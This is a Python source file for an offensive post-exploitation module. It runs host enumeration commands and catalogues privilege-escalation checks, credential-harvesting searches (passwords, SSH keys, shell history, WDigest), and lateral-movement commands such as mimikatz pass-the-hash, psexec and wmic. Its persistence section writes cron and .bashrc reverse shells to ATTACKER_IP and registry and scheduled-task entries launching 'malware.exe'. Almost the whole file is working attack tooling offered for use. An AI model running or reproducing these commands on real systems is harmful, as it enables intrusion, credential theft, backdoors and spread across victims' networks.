"""
Post-Exploitation Module
Privilege escalation, credential harvesting, persistence, lateral movement
"""

import asyncio
import platform
import subprocess
import os
import re
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class PostExploitFinding:
    """Post-exploitation finding"""
    category: str
    description: str
    severity: str
    commands: List[str] = field(default_factory=list)
    artifacts: List[str] = field(default_factory=list)


class PostExploitation:
    """Post-exploitation enumeration and privilege escalation"""
    
    def __init__(self, os_type: Optional[str] = None):
        self.os_type = os_type or platform.system().lower()
        self.findings: List[PostExploitFinding] = []
        
    async def enumerate_system(self) -> Dict[str, Any]:
        """Enumerate system information"""
        
        system_info = {
            'os': self.os_type,
            'hostname': platform.node(),
            'architecture': platform.machine(),
            'python_version': platform.python_version()
        }
        
        if self.os_type in ['linux', 'darwin']:
            commands = {
                'kernel': 'uname -a',
                'users': 'cat /etc/passwd',
                'groups': 'cat /etc/group',
                'sudo_version': 'sudo --version',
                'cron_jobs': 'cat /etc/crontab',
                'network': 'ifconfig -a || ip a',
                'processes': 'ps aux',
                'mounts': 'mount'
            }
        else:  # Windows
            commands = {
                'system_info': 'systeminfo',
                'users': 'net user',
                'groups': 'net localgroup',
                'network': 'ipconfig /all',
                'processes': 'tasklist',
                'services': 'net start',
                'scheduled_tasks': 'schtasks /query'
            }
        
        for key, cmd in commands.items():
            try:
                result = subprocess.run(
                    cmd, 
                    shell=True, 
                    capture_output=True, 
                    text=True, 
                    timeout=10
                )
                system_info[key] = result.stdout
            except:
                system_info[key] = "Failed to retrieve"
        
        return system_info
    
    def get_privesc_checks_linux(self) -> List[PostExploitFinding]:
        """Linux privilege escalation checks"""
        checks = []
        
        # SUID binaries
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Find SUID/SGID binaries that could be exploited',
            severity='high',
            commands=[
                'find / -perm -u=s -type f 2>/dev/null',
                'find / -perm -g=s -type f 2>/dev/null',
                'find / -perm -4000 -o -perm -2000 -type f 2>/dev/null'
            ],
            artifacts=['Vulnerable SUID binaries: nmap, vim, find, bash, more, less, nano']
        ))
        
        # Writable /etc/passwd
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Check if /etc/passwd is writable',
            severity='critical',
            commands=['ls -l /etc/passwd', 'test -w /etc/passwd && echo "WRITABLE"'],
            artifacts=['If writable, can add root user directly']
        ))
        
        # Sudo privileges
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Check sudo privileges',
            severity='high',
            commands=[
                'sudo -l',
                'cat /etc/sudoers 2>/dev/null',
                'find /etc/sudoers.d -type f 2>/dev/null | xargs cat'
            ],
            artifacts=['NOPASSWD entries, specific command privileges']
        ))
        
        # Kernel exploits
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Check kernel version for known exploits',
            severity='high',
            commands=[
                'uname -r',
                'cat /proc/version',
                'lsb_release -a'
            ],
            artifacts=['DirtyCOW (CVE-2016-5195), CVE-2021-4034 (PwnKit), CVE-2022-0847 (Dirty Pipe)']
        ))
        
        # Cron jobs
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Check for writable cron jobs',
            severity='medium',
            commands=[
                'cat /etc/crontab',
                'ls -la /etc/cron.*',
                'crontab -l',
                'find /etc/cron.* -type f -writable'
            ],
            artifacts=['Writable cron scripts running as root']
        ))
        
        # PATH hijacking
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Check for PATH hijacking opportunities',
            severity='medium',
            commands=[
                'echo $PATH',
                'find / -writable -type d 2>/dev/null | grep -E "^/|bin|sbin"'
            ],
            artifacts=['Writable directories in PATH before /usr/bin']
        ))
        
        # Credentials in files
        checks.append(PostExploitFinding(
            category='credential_harvesting',
            description='Search for credentials in common locations',
            severity='high',
            commands=[
                'grep -r "password" /home /root /var/www 2>/dev/null | grep -v "Binary"',
                'find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | xargs grep -i "pass\\|pwd\\|credential" 2>/dev/null',
                'cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -i "pass\\|ssh\\|ftp"',
                'find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null'
            ],
            artifacts=['SSH keys, database credentials, API keys']
        ))
        
        # Docker escape
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Check for Docker container escape',
            severity='high',
            commands=[
                'cat /proc/1/cgroup | grep docker',
                'ls -la /.dockerenv',
                'mount | grep docker',
                'docker ps 2>/dev/null',
                'groups | grep docker'
            ],
            artifacts=['Docker socket mounted, privileged container, docker group membership']
        ))
        
        return checks
    
    def get_privesc_checks_windows(self) -> List[PostExploitFinding]:
        """Windows privilege escalation checks"""
        checks = []
        
        # Unquoted service paths
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Find unquoted service paths',
            severity='high',
            commands=[
                'wmic service get name,pathname | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """"',
                'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services'
            ],
            artifacts=['Services with spaces in path without quotes']
        ))
        
        # Weak service permissions
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Check for weak service permissions',
            severity='high',
            commands=[
                'sc query state= all',
                'accesschk.exe -uwcqv "Authenticated Users" * /accepteula',
                'icacls "C:\\Program Files"'
            ],
            artifacts=['Services modifiable by non-admin users']
        ))
        
        # AlwaysInstallElevated
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Check AlwaysInstallElevated registry key',
            severity='critical',
            commands=[
                'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
                'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'
            ],
            artifacts=['If both set to 1, MSI packages run as SYSTEM']
        ))
        
        # Stored credentials
        checks.append(PostExploitFinding(
            category='credential_harvesting',
            description='Search for stored credentials',
            severity='high',
            commands=[
                'cmdkey /list',
                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
                'findstr /si password *.txt *.xml *.config',
                'dir /s /b *password* *credential* *vnc*'
            ],
            artifacts=['Saved RDP credentials, autologon credentials']
        ))
        
        # Mimikatz opportunities
        checks.append(PostExploitFinding(
            category='credential_harvesting',
            description='Check for credential dumping opportunities',
            severity='critical',
            commands=[
                'reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential',
                'reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL'
            ],
            artifacts=['WDigest enabled, LSA Protection disabled']
        ))
        
        # PowerShell history
        checks.append(PostExploitFinding(
            category='credential_harvesting',
            description='Check PowerShell history for credentials',
            severity='medium',
            commands=[
                'type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',
                'Get-Content (Get-PSReadlineOption).HistorySavePath'
            ],
            artifacts=['Passwords in command history']
        ))
        
        # Token privileges
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Check current token privileges',
            severity='high',
            commands=[
                'whoami /priv',
                'whoami /groups'
            ],
            artifacts=['SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege']
        ))
        
        return checks
    
    def get_persistence_techniques(self) -> List[PostExploitFinding]:
        """Get persistence mechanism suggestions"""
        techniques = []
        
        if self.os_type in ['linux', 'darwin']:
            techniques.extend([
                PostExploitFinding(
                    category='persistence',
                    description='Add SSH key for persistence',
                    severity='high',
                    commands=[
                        'mkdir -p ~/.ssh',
                        'echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys',
                        'chmod 600 ~/.ssh/authorized_keys'
                    ]
                ),
                PostExploitFinding(
                    category='persistence',
                    description='Add cron job for reverse shell',
                    severity='high',
                    commands=[
                        '(crontab -l ; echo "*/5 * * * * /bin/bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\'") | crontab -'
                    ]
                ),
                PostExploitFinding(
                    category='persistence',
                    description='Modify .bashrc for persistence',
                    severity='medium',
                    commands=[
                        'echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &" >> ~/.bashrc'
                    ]
                )
            ])
        else:  # Windows
            techniques.extend([
                PostExploitFinding(
                    category='persistence',
                    description='Registry Run key persistence',
                    severity='high',
                    commands=[
                        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\malware.exe" /f'
                    ]
                ),
                PostExploitFinding(
                    category='persistence',
                    description='Scheduled task persistence',
                    severity='high',
                    commands=[
                        'schtasks /create /tn "Updater" /tr "C:\\malware.exe" /sc onlogon /ru System'
                    ]
                ),
                PostExploitFinding(
                    category='persistence',
                    description='WMI event subscription',
                    severity='high',
                    commands=[
                        'wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE Name="Updater", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"'
                    ]
                )
            ])
        
        return techniques
    
    def get_lateral_movement_commands(self) -> List[PostExploitFinding]:
        """Get lateral movement techniques"""
        commands = []
        
        if self.os_type in ['linux', 'darwin']:
            commands.extend([
                PostExploitFinding(
                    category='lateral_movement',
                    description='Scan internal network',
                    severity='medium',
                    commands=[
                        'for i in {1..254}; do ping -c 1 192.168.1.$i | grep "64 bytes" & done',
                        'netstat -tulnp | grep LISTEN'
                    ]
                ),
                PostExploitFinding(
                    category='lateral_movement',
                    description='SSH to other hosts using found keys',
                    severity='high',
                    commands=[
                        'find / -name "id_rsa" 2>/dev/null',
                        'ssh -i /path/to/key user@internal_host'
                    ]
                ),
                PostExploitFinding(
                    category='lateral_movement',
                    description='Port forwarding for pivoting',
                    severity='high',
                    commands=[
                        'ssh -L 8080:internal_host:80 user@compromised_host',
                        'ssh -D 1080 user@compromised_host  # SOCKS proxy'
                    ]
                )
            ])
        else:  # Windows
            commands.extend([
                PostExploitFinding(
                    category='lateral_movement',
                    description='Pass-the-Hash attack',
                    severity='critical',
                    commands=[
                        'mimikatz.exe "sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:powershell.exe"'
                    ]
                ),
                PostExploitFinding(
                    category='lateral_movement',
                    description='PSExec to remote host',
                    severity='high',
                    commands=[
                        'psexec.exe \\\\TARGET_HOST -u DOMAIN\\user -p password cmd.exe'
                    ]
                ),
                PostExploitFinding(
                    category='lateral_movement',
                    description='WMI for remote execution',
                    severity='high',
                    commands=[
                        'wmic /node:TARGET_HOST /user:DOMAIN\\user /password:password process call create "cmd.exe /c COMMAND"'
                    ]
                )
            ])
        
        return commands
    
    async def run_full_enumeration(self, execute_commands: bool = False) -> Dict[str, Any]:
        """Run full post-exploitation enumeration"""
        
        print(f"\nüîç Starting Post-Exploitation Enumeration")
        print(f"Operating System: {self.os_type.upper()}\n")
        
        # System enumeration
        print(f"üìä Enumerating system information...")
        system_info = await self.enumerate_system()
        
        # Privilege escalation checks
        print(f"\nüîì Checking privilege escalation vectors...")
        if self.os_type in ['linux', 'darwin']:
            privesc_checks = self.get_privesc_checks_linux()
        else:
            privesc_checks = self.get_privesc_checks_windows()
        
        print(f"‚úÖ Found {len(privesc_checks)} privilege escalation checks")
        
        # Persistence techniques
        print(f"\nüîí Gathering persistence techniques...")
        persistence = self.get_persistence_techniques()
        print(f"‚úÖ Found {len(persistence)} persistence techniques")
        
        # Lateral movement
        print(f"\n‚û°Ô∏è  Gathering lateral movement techniques...")
        lateral_movement = self.get_lateral_movement_commands()
        print(f"‚úÖ Found {len(lateral_movement)} lateral movement techniques")
        
        # Execute commands if requested
        results = {}
        if execute_commands:
            print(f"\n‚ö†Ô∏è  Executing enumeration commands...")
            for check in privesc_checks:
                for cmd in check.commands[:1]:  # Execute only first command of each check
                    try:
                        result = subprocess.run(
                            cmd,
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout=10
                        )
                        results[cmd] = {
                            'stdout': result.stdout[:500],  # Limit output
                            'stderr': result.stderr[:500],
                            'returncode': result.returncode
                        }
                    except Exception as e:
                        results[cmd] = {'error': str(e)}
        
        return {
            'os_type': self.os_type,
            'system_info': system_info,
            'privilege_escalation': [
                {
                    'category': c.category,
                    'description': c.description,
                    'severity': c.severity,
                    'commands': c.commands,
                    'artifacts': c.artifacts
                }
                for c in privesc_checks
            ],
            'persistence': [
                {
                    'category': p.category,
                    'description': p.description,
                    'severity': p.severity,
                    'commands': p.commands
                }
                for p in persistence
            ],
            'lateral_movement': [
                {
                    'category': l.category,
                    'description': l.description,
                    'severity': l.severity,
                    'commands': l.commands
                }
                for l in lateral_movement
            ],
            'command_results': results if execute_commands else {}
        }
